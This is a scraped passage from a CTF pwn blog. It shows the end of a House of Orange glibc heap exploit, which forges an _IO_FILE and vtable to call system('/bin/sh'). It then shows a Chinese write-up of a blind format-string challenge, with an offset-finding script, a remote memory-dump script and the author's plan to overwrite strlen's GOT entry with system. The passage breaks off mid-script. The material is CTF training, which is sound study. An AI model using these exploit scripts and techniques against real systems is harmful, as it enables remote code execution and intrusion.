main_arena = <span class="number">0x3c4b20</span></span><br><span class="line">	</span><br><span class="line">	ad(<span class="number">0x10</span>, <span class="string">&#x27;A&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">	p = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">	p += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">	p += p64(<span class="number">0x1f00000010</span>)</span><br><span class="line">	p += p64(<span class="number">0</span>)</span><br><span class="line">	p += p64(<span class="number">0</span>)</span><br><span class="line">	p += p64(<span class="number">0x00fa1</span>)</span><br><span class="line">	<span class="comment"># top chunk size 0x20fa1</span></span><br><span class="line">	<span class="comment"># top chunk addr 0x555555758060</span></span><br><span class="line">	<span class="comment"># alignment: 555555779001 -&gt; 0x1000</span></span><br><span class="line">	li(<span class="string">&#x27;addr: &#x27;</span> + <span class="built_in">hex</span>(<span class="number">0xfa1</span> + <span class="number">0x1000</span>))</span><br><span class="line">	md(<span class="number">0x80</span>, p)</span><br><span class="line"></span><br><span class="line">	ad(<span class="number">0x1000</span>, <span class="string">&#x27;B&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># leak libc base with overflow</span></span><br><span class="line">	ad(<span class="number">0x400</span>, <span class="string">&#x27;C&#x27;</span> * <span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">	dp()</span><br><span class="line">	lib.address = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-5</span>:] + <span class="string">&#x27;\x7f\x00\x00&#x27;</span>) - main_arena - <span class="number">1640</span></span><br><span class="line">	li(<span class="string">&#x27;libc_base &#x27;</span> + <span class="built_in">hex</span>(lib.address))</span><br><span class="line"></span><br><span class="line">	<span class="comment"># leak heap addr with large bin</span></span><br><span class="line">	md(<span class="number">0x10</span>, <span class="string">&#x27;C&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">	dp()</span><br><span class="line">	ru(<span class="string">&#x27;CCCCCCCCCCCCCCCC&#x27;</span>)</span><br><span class="line">	heap = u64(ru(<span class="string">&#x27;\x0a&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0xc0</span></span><br><span class="line">	li(<span class="string">&#x27;heap &#x27;</span> + <span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line">	_IO_list_all = lib.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">	li(<span class="string">&#x27;_IO_list_all &#x27;</span> + <span class="built_in">hex</span>(_IO_list_all))</span><br><span class="line"></span><br><span class="line">	<span class="comment"># Control program</span></span><br><span class="line">	p = <span class="string">&#x27;B&#x27;</span> * <span class="number">0x400</span></span><br><span class="line">	p += p64(<span class="number">0</span>)</span><br><span class="line">	p += p64(<span class="number">0x21</span>)</span><br><span class="line">	p += <span class="string">&#x27;B&#x27;</span> * <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># fake file</span></span><br><span class="line">	f = <span class="string">&#x27;/bin/sh\x00&#x27;</span> <span class="comment"># flag overflow arg -&gt; system(&#x27;/bin/sh&#x27;)</span></span><br><span class="line">	f += p64(<span class="number">0x61</span>)    <span class="comment"># _IO_read_ptr small bin size</span></span><br><span class="line">	<span class="comment">#  unsoted bin attack</span></span><br><span class="line">	f += p64(<span class="number">0</span>) <span class="comment"># _IO_read_end)</span></span><br><span class="line">	f += p64(_IO_list_all - <span class="number">0x10</span>)  <span class="comment"># _IO_read_base</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">#bypass check</span></span><br><span class="line">	<span class="comment"># fp-&gt;_IO_write_base &lt; fp-&gt;_IO_write_ptr</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># fp-&gt;mode &lt;=0 ((addr + 0xc8) &lt;= 0)</span></span><br><span class="line">	f += p64(<span class="number">0</span>) <span class="comment"># _IO_write_base </span></span><br><span class="line">	f += p64(<span class="number">1</span>) <span class="comment"># _IO_write_ptr</span></span><br><span class="line"></span><br><span class="line">	f += p64(<span class="number">0</span>) <span class="comment"># _IO_write_end</span></span><br><span class="line">	f += p64(<span class="number">0</span>) <span class="comment"># _IO_buf_base</span></span><br><span class="line">	f += p64(<span class="number">0</span>) <span class="comment"># _IO_buf_end</span></span><br><span class="line">	f += p64(<span class="number">0</span>) <span class="comment"># _IO_save_base</span></span><br><span class="line">	f += p64(<span class="number">0</span>) <span class="comment"># _IO_backup_base</span></span><br><span class="line">	f += p64(<span class="number">0</span>) <span class="comment"># _IO_save_end</span></span><br><span class="line">	f += p64(<span class="number">0</span>) <span class="comment"># *_markers</span></span><br><span class="line">	f += p64(<span class="number">0</span>) <span class="comment"># *_chain</span></span><br><span class="line"></span><br><span class="line">	f += p32(<span class="number">0</span>) <span class="comment"># _fileno</span></span><br><span class="line">	f += p32(<span class="number">0</span>) <span class="comment"># _flags2</span></span><br><span class="line"></span><br><span class="line">	f += p64(<span class="number">1</span>)  <span class="comment"># _old_offset</span></span><br><span class="line"></span><br><span class="line">	f += p16(<span class="number">2</span>) <span class="comment"># ushort _cur_colum;</span></span><br><span class="line">	f += p8(<span class="number">3</span>)  <span class="comment"># char _vtable_offset</span></span><br><span class="line">	f += p8(<span class="number">4</span>)  <span class="comment"># char _shrotbuf[1]</span></span><br><span class="line">	f += p32(<span class="number">0</span>) <span class="comment"># null for alignment</span></span><br><span class="line"></span><br><span class="line">	f += p64(<span class="number">0</span>) <span class="comment"># _offset</span></span><br><span class="line">	f += p64(<span class="number">6</span>) <span class="comment"># _codecvt</span></span><br><span class="line">	f += p64(<span class="number">0</span>) <span class="comment"># _wide_data</span></span><br><span class="line">	f += p64(<span class="number">0</span>) <span class="comment"># _freeres_list</span></span><br><span class="line">	f += p64(<span class="number">0</span>) <span class="comment"># _freeres_buf</span></span><br><span class="line"></span><br><span class="line">	f += p64(<span class="number">0</span>) <span class="comment"># __pad5</span></span><br><span class="line">	f += p32(<span class="number">0</span>) <span class="comment"># _mode</span></span><br><span class="line">	f += p32(<span class="number">0</span>) <span class="comment"># _unused2</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">#f = f.ljust(0xc0, &#x27;\x00&#x27;)</span></span><br><span class="line"></span><br><span class="line">	p += f</span><br><span class="line">	p += p64(<span class="number">0</span>) * <span class="number">3</span> <span class="comment"># alignment to vtable</span></span><br><span class="line">	p += p64(heap + <span class="number">0x5C8</span>) <span class="comment"># vtable</span></span><br><span class="line">	p += p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line"></span><br><span class="line">	p += p64(lib.sym[<span class="string">&#x27;system&#x27;</span>]) <span class="comment"># </span></span><br><span class="line">	md(<span class="number">0x600</span>, p)</span><br><span class="line"></span><br><span class="line">	db()</span><br><span class="line">	sl(<span class="string">&#x27;1&#x27;</span>) <span class="comment">#get shell</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># malloc(0x10) -&gt; malloc_printerr -&gt; overflow(IO_FILE addr) -&gt; system(&#x27;/bin/sh&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">			io = exe.process(env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : libFile&#125;)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = exe.process()</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		io = remote(remoteIp, remotePort)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">	</span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/05/01/wp-house-of-orange/" data-id="ckhemv859006cwdcmdot4460c" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-wp-axb-2019-fmt32" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/04/24/wp-axb-2019-fmt32/" class="article-date">
  <time datetime="2020-04-24T05:32:12.000Z" itemprop="datePublished">2020-04-24</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/04/24/wp-axb-2019-fmt32/">wp axb-2019-fmt32</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="AXB-2019-fmt"><a href="#AXB-2019-fmt" class="headerlink" title="AXB_2019_fmt"></a>AXB_2019_fmt</h1><h2 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h2><p>AXB_2019</p>
<h2 id="难度"><a href="#难度" class="headerlink" title="难度"></a>难度</h2><p>4/ 10</p>
<h2 id="简单描述"><a href="#简单描述" class="headerlink" title="简单描述"></a>简单描述</h2><p>不给elf文件, 盲打.</p>
<h2 id="vul"><a href="#vul" class="headerlink" title="vul"></a>vul</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">logan@LYXF:~/share/axb_fmt1$ nc node3.buuoj.cn 29458</span><br><span class="line">Hello,I am a computer Repeater updated.</span><br><span class="line">After a lot of machine learning,I know that the essence of man is a reread machine!</span><br><span class="line">So I<span class="string">&#x27;ll answer whatever you say!</span></span><br><span class="line"><span class="string">Please tell me:%p %p</span></span><br><span class="line"><span class="string">Repeater:0x804888d 0xffde142f</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Please tell me:^c</span></span><br></pre></td></tr></table></figure>

<p>存在字符串漏洞, 输出4bytes的地址, 这是一个32位程序</p>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>fmt vul的各种利用, fmt vul dump文件, fmt vul修改内存.</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>先使用脚本算出偏移,然后编写dump脚本, 这是一个32 bit的程序,就从0x08048000开始dump内存然后写入本地文件中, 后面就简单得多了, 分析所dump的文件,发现strlen对字符串的长度进行判断, 采用字符串漏洞泄漏libc,随便找一个函数都行,计算偏移,然后再获取system函数, 修改strlen的got地址为system,再输入时输入’;/bin/sh’就行, 注意,因为strlen传入的时候, Repeater:也跟着传入, 在linux bash中以’; ‘来进行分割命令,所以相当于执行两次命令, 一个Repeater:和一个/bin/sh.</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="计算偏移"><a href="#计算偏移" class="headerlink" title="计算偏移"></a>计算偏移</h3><p>这个是我自己写的一个跑偏移脚本, 十分方便,用手数…^_^</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Author: I0gan</span></span><br><span class="line"><span class="comment"># Team  : D0g3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]</span></span><br><span class="line"><span class="comment">#context.terminal = &#x27;konsole&#x27;</span></span><br><span class="line"><span class="comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#exeFile  = &quot;./4th-CyberEarth&quot;</span></span><br><span class="line"></span><br><span class="line">remoteIp = <span class="string">&quot;node3.buuoj.cn&quot;</span></span><br><span class="line">remotePort = <span class="number">29619</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">maxLen = <span class="number">0x30</span></span><br><span class="line">minLen = <span class="number">0x10</span></span><br><span class="line">preSendStr = <span class="string">&#x27;&#x27;</span></span><br><span class="line">recvStr = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">pd32  = <span class="keyword">lambda</span> x : p32(x).decode() <span class="comment">#python3 not surport str + bytes</span></span><br><span class="line">pd64  = <span class="keyword">lambda</span> x : p64(x).decode()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(x)</span><br><span class="line">db    = <span class="keyword">lambda</span>   : gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span>(<span class="params">payload</span>):</span></span><br><span class="line">	<span class="keyword">if</span>(preSendStr == <span class="string">&#x27;&#x27;</span>):</span><br><span class="line">		sl(payload)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		sla(preSendStr, payload)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(recvStr != <span class="string">&#x27;&#x27;</span>):</span><br><span class="line">		ru(recvStr)</span><br><span class="line"></span><br><span class="line">	recv = ra()</span><br><span class="line">	infos = recv.split(<span class="string">&#x27;, &#x27;</span>)</span><br><span class="line">	offset = <span class="number">-1</span></span><br><span class="line">	<span class="keyword">for</span> info <span class="keyword">in</span> infos:</span><br><span class="line">		li(info)</span><br><span class="line">		offset += <span class="number">1</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="string">&#x27;0x44434241&#x27;</span> == info):</span><br><span class="line">			<span class="keyword">return</span> offset	</span><br><span class="line">	<span class="comment">#pause()</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	length = <span class="number">0</span>;</span><br><span class="line">	payload = <span class="string">&#x27;ABCD&#x27;</span> + <span class="string">&#x27;, %p&#x27;</span> * minLen</span><br><span class="line">	<span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">		<span class="keyword">if</span> LOCAL:</span><br><span class="line">			io = process(exeFile)	</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = remote(remoteIp, remotePort)</span><br><span class="line">		offset = calc(payload) </span><br><span class="line">		<span class="keyword">if</span>(<span class="number">-1</span> != offset):</span><br><span class="line">			li(<span class="string">&#x27;---------------------------------------------&#x27;</span>)</span><br><span class="line">			li(<span class="string">&#x27;\noffset:&#x27;</span> + <span class="built_in">str</span>(offset))	</span><br><span class="line">			io.close()</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		io.close()</span><br><span class="line">		payload += <span class="string">&#x27;, %p&#x27;</span>	</span><br><span class="line">		length += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(length &gt; maxLen):</span><br><span class="line">			li(<span class="string">&#x27;---------------------------------------------&#x27;</span>)</span><br><span class="line">			li(<span class="string">&#x27;not found! maxLen too litile&#x27;</span>)</span><br><span class="line">			io.close</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>跑的操作如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">logan@LYXF:~&#x2F;share&#x2F;axb_fmt1$ python calc_fmt_offset.py </span><br><span class="line">[+] Opening connection to node3.buuoj.cn on port 29458: Done</span><br><span class="line">[DEBUG] Sent 0x45 bytes:</span><br><span class="line">    &#39;ABCD, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p\n&#39;</span><br><span class="line">[-] Receiving all data: Failed</span><br><span class="line">[DEBUG] Received 0x7b bytes:</span><br><span class="line">    &#39;Hello,I am a computer Repeater updated.\n&#39;</span><br><span class="line">    &#39;After a lot of machine learning,I know that the essence of man is a reread machine!&#39;</span><br><span class="line">[DEBUG] Received 0x31 bytes:</span><br><span class="line">    &#39;\n&#39;</span><br><span class="line">    &quot;So I&#39;ll answer whatever you say!\n&quot;</span><br><span class="line">    &#39;Please tell me:&#39;</span><br><span class="line">[DEBUG] Received 0xc8 bytes:</span><br><span class="line">    &#39;Repeater:ABCD, 0x804888d, 0xffe54d3f, 0xf7f5a53c, 0xffe54d48, 0xf7f365c5, 0x4f, 0x41e54e34, 0x2c444342, 0x2c702520, 0x2c702520, 0x2c702520, 0x2c702520, 0x2c702520, 0x2c702520, 0x2c702520, 0x2c702520\n&#39;</span><br><span class="line">    &#39;\n&#39;</span><br></pre></td></tr></table></figure>

<p>通过手数, 差一个字节偏移就为8 (0x41e54e34, 0x2c444342), 后面再利用的时候就要得补一字节对其.</p>
<h3 id="编写dump脚本"><a href="#编写dump脚本" class="headerlink" title="编写dump脚本"></a>编写dump脚本</h3><p>利用 printf 中的 %s来进行dump, ‘%’ + str(offset + x) + ‘$s’ + p32(target_addr)来调整所dump的参数位置, 这就可以dump出任何内存的值了, 我们知道, linux32位程序,若没有开启pie的话,elf文件就加载到0x08048000起始位置, linux 64位程序就加载到0x400000位置, 所以我们就从0x08048000位置开始dump, 注意 dump出来的数据是以’\x00’结尾的, 每一条数据后面都要加一条‘\x00’,dump为空的也数据也就为 ‘\x00’,循环dump数据,写入文件, 我也是第一次写dump文件,照着ctf-wiki中那个方法, dump感觉太慢了,每次都要重新连接,而这个体是循环输入的,不用每次dump都重新连接,还有,dump的时候,无误了,尽量把IO输出给删了, 极大影响dump的速率,尽最大的关掉, 还有在打远程的时候总是容易断开,如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[*] dumping: 1660&#x2F;12288</span><br><span class="line">[*] dumping: 2010&#x2F;12288</span><br><span class="line">[*] dumping: 2140&#x2F;12288</span><br><span class="line">[*] dumping: 2270&#x2F;12288</span><br><span class="line">[*] dumping: 2280&#x2F;12288</span><br><span class="line">[*] dumping: 2310&#x2F;12288</span><br><span class="line">[*] dumping: 2320&#x2F;12288</span><br><span class="line">[*] dumping: 2380&#x2F;12288</span><br><span class="line">[*] dumping: 2390&#x2F;12288</span><br><span class="line">[*] dumping: 2460&#x2F;12288</span><br><span class="line">[*] Error.</span><br></pre></td></tr></table></figure>
<p>这就导致dump的数据太少了, 我就改进了一下,添加一个重新连接,继续dump.改进后如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] dumping: 2540&#x2F;12288</span><br><span class="line">[*] Closed connection to node3.buuoj.cn port 29458</span><br><span class="line">[*] Error.</span><br><span class="line">[+] Opening connection to node3.buuoj.cn on port 29458: Done</span><br><span class="line">[*] dumping: 2550&#x2F;12288</span><br><span class="line">[*] dumping: 2560&#x2F;12288</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="dump-文件脚本"><a href="#dump-文件脚本" class="headerlink" title="dump 文件脚本"></a>dump 文件脚本</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author: I0gan</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">This is a dump file script</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">exeFile = <span class="string">&#x27;&#x27;</span></span><br><span class="line">libFile = <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line">remoteIp = <span class="string">&quot;node3.buuoj.cn&quot;</span></span><br><span class="line">remotePort = <span class="number">29458</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="number">1</span></span><br><span class="line">LIB   = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Exploit--------------------------</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">8</span> + <span class="number">2</span> + <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getbinary</span>():</span></span><br><span class="line">	data_length = <span class="number">0x3000</span> <span class="comment">#想要获取数据的长度.</span></span><br><span class="line">	base_addr = <span class="number">0x08048000</span> <span class="comment"># 起始地址</span></span><br><span class="line">	end_addr  = base_addr + data_length <span class="comment"># 结束地址</span></span><br><span class="line">	f = <span class="built_in">open</span>(<span class="string">&#x27;binary&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">	addr = base_addr</span><br><span class="line">	isDisConnect = <span class="literal">False</span></span><br><span class="line">	disConnectMaxTimes = <span class="number">3</span> <span class="comment">#这里可以设定一个最大断开连接次数,网络差就调大一点</span></span><br><span class="line"></span><br><span class="line">	io = remote(remoteIp, remotePort)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(disConnectMaxTimes):</span><br><span class="line">		io.recvuntil(<span class="string">&#x27;Please tell me:&#x27;</span>)</span><br><span class="line">		<span class="keyword">while</span> addr &lt; end_addr:</span><br><span class="line">			<span class="keyword">try</span>:</span><br><span class="line">				p = <span class="string">&#x27;ABCDE&#x27;</span> <span class="comment">#随便一些自己规定的字符,从这里开始读取数据</span></span><br><span class="line">				p += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(offset)</span><br><span class="line">				p += <span class="string">&#x27;$s&#x27;</span></span><br><span class="line">				p += <span class="string">&#x27;CBAABCD&#x27;</span> <span class="comment">#随便一些自己规定的字符,方便结尾,中间的数据就是dump的数据了</span></span><br><span class="line">				p += p32(addr)</span><br><span class="line">				io.send(p)</span><br><span class="line">				io.recvuntil(<span class="string">&#x27;ABCDE&#x27;</span>, drop = <span class="literal">True</span>)</span><br><span class="line">				data = io.recvuntil(<span class="string">&#x27;CBAABCD&#x27;</span>, drop = <span class="literal">True</span>)</span><br><span class="line">				<span class="comment">#print data</span></span><br><span class="line">			<span class="keyword">except</span> EOFError: <span class="comment">#读有错误的话,就断开重新连接</span></span><br><span class="line">				isDisconnect = <span class="literal">True</span></span><br><span class="line">				io.close()</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">	</span><br><span class="line">			<span class="keyword">if</span> <span class="built_in">len</span>(data) == <span class="number">0</span>: <span class="comment">#为0的话,说明读到的值为0,就没有输出,但数据还是要的补上</span></span><br><span class="line">				f.write(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">				addr += <span class="number">1</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				data += <span class="string">&#x27;\x00&#x27;</span> <span class="comment"># 注意字符串结尾是&#x27;\x00&#x27;是不会打印的,要得补上</span></span><br><span class="line">				f.write(data)</span><br><span class="line">				addr += <span class="built_in">len</span>(data)</span><br><span class="line">			<span class="keyword">if</span>(((addr - base_addr) % <span class="number">10</span>) == <span class="number">0</span>): <span class="comment">#这里就是输出的进度了.</span></span><br><span class="line">				print(<span class="string">&#x27;dumping: &#x27;</span> + <span class="built_in">str</span>(addr - base_addr) + <span class="string">&#x27;/&#x27;</span> + <span class="built_in">str</span>(data_length))</span><br><span class="line">		